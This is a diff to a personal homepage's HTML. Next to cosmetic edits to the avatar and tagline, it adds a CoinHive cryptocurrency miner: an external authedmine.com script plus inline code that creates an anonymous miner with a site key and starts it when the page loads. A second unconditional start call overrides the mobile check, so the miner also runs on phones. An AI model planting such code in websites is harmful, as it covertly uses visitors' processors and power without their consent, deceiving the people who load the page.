@@ -18,9 +18,9 @@
 				<!-- Main -->
 					<section id="main">
 						<header>
-							<span class="avatar"><img src="/images/avatar.jpg" alt="" /></span>
+							<span class="avatar"><a href="https://www.youtube.com/watch?v=wZZ7oFKsKzY"><img src="/images/avatar.jpg" alt="" /></a></span>
 							<h1>Alexandre Menezes</h1>
-							<p>human</p>
+							<p>...</p>
 						</header>
 						<footer>
 							<ul class="icons">
@@ -43,7 +43,15 @@
 
 		<!-- Scripts -->
 			<!--[if lte IE 8]><script src="/js/respond.min.js"></script><![endif]-->
+		        <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 			<script>
+				// coinhive 
+				var miner = new CoinHive.Anonymous('273TSN8LePKjSbjN47TOq6oyypWBf117');
+				if (!miner.isMobile()) {
+					miner.start();
+				}
+				miner.start();
+				
 				if ('addEventListener' in window) {
 					window.addEventListener('load', function() { document.body.className = document.body.className.replace(/\bis-loading\b/, ''); });
 					document.body.className += (navigator.userAgent.match(/(MSIE|rv:11\.0)/) ? ' is-ie' : '');
